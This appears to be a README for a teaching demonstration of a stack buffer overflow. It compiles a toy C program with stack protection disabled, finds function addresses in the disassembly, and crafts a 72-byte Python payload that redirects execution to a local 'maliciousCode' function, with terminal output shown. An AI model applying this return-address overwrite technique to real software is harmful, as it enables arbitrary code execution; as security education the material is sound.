# StackBufferOverflow
A simple example for Stack Buffer Overflow Demonstration . 

Environment: Ubuntu 16.04 VM on 64 bit Mac OS with gcc and python.  

Steps to see the exploit:   

**1. Compile**  
  gcc main.c -o stack -fno-stack-protector   
  -fno-stack-protector option disables the stack protection so that stack smashing will be allowed  
  
**2. Read disassembly code** (This will vary from system to system)  
  Run 'objdump -d stack' command to see disassembly code   
  
  ![alt text](https://github.com/ashokyannam/StackBufferOverflow/blob/master/disassembly.png)

The address of maliciousCode function is 00000000004005b6    

The address of inputDataProcessing function is 00000000004005c7      

0x40 or 64 bytes are reserved for dataBuffer based on below instruction    
4005d9:	48 8d 45 c0          	lea    -0x40(%rbp),%rax   

**3. Crafting the attack pay load**

Value of dataBuffer size allocated is 64 bytes which is followed by %rbp, the base pointer of main function. So, given this is a 64 bit machine, %rbp will be stored in next 8 bytes and then return address in next eight bytes. So, the pay load size would be 72 bytes (64 + 8) and then the return address will be overwritten with maliciousCode’s address in little-endian fashion. The input stream to our vulnerable code looks like as below.

python -c 'print "a"*72 + "\xb6\x05\x40\x00\x00\x00\x00\x00"'   

**4. Output with incorrect pay load size**   

ml@ml-VirtualBox:~/Desktop/StackOverflow$ python -c 'print "a"*64 + "\xb6\x05\x40\x00\x00\x00\x00\x00"' | ./stack    
Get Input Data Stream:    
Input Data Stream: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�@  
Segmentation fault (core dumped)   

**5. Output with correct pay load size**    

ml@ml-VirtualBox:~/Desktop/StackOverflow$ python -c 'print "a"*72 + "\xb6\x05\x40\x00\x00\x00\x00\x00"' | ./stack  
Get Input Data Stream:      
Input Data Stream: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�@    
**Successfully executed malicious code!**     
Segmentation fault (core dumped)      


